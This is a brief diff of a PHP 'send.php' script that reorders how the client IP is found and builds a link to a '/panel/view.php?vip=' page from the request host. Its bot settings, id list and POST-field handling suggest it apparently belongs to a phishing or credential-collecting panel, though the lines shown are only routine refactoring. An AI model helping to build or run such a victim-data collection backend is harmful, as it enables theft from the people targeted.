@@ -9,11 +9,12 @@ require "../test_config.php";
 $bot = $a_bot;
 $ids = explode(",",str_replace(" ","",$a_ids));
 
-
-$panel = str_replace('msdpweb/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/panel/view.php?vip=$ip");
-
-// Get real IP (handles proxies/Docker)
+// Get real IP first (handles proxies/Docker/Koyeb)
 $ip = getRealClientIP();
+
+// Get host from HTTP_HOST (Koyeb passes real domain correctly)
+$host = $_SERVER['HTTP_HOST'];
+$panel = "http://" . $host . "/panel/view.php?vip=" . $ip;
 
 function post($data){
 	if(!isset($_POST[$data]) || empty(trim($_POST[$data]))){
